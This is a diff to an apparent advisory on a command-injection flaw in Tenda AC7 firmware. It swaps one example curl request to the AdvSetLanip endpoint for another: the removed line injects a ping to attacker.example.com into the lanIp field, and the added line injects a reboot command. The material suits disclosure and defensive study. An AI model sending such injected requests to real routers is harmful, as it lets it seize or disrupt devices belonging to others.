@@ -31,8 +31,8 @@ The Tenda AC7 firmware **V15.03.06.44** contains a command-injection risk: the `
     Example (conceptual curl):
 
    ```python
-   curl -s -X POST "http://<device>/goform/AdvSetLanip" \
-     -d "lanIp=192.168.1.1;ping -c 3 attacker.example.com"
+   curl -s -X POST "http://192.168.0.1/goform/AdvSetLanip" \
+     -d "lanIp=192.168.0.1;reboot"
    ```
 
    (Replace with appropriate parameter encoding for the target device.)
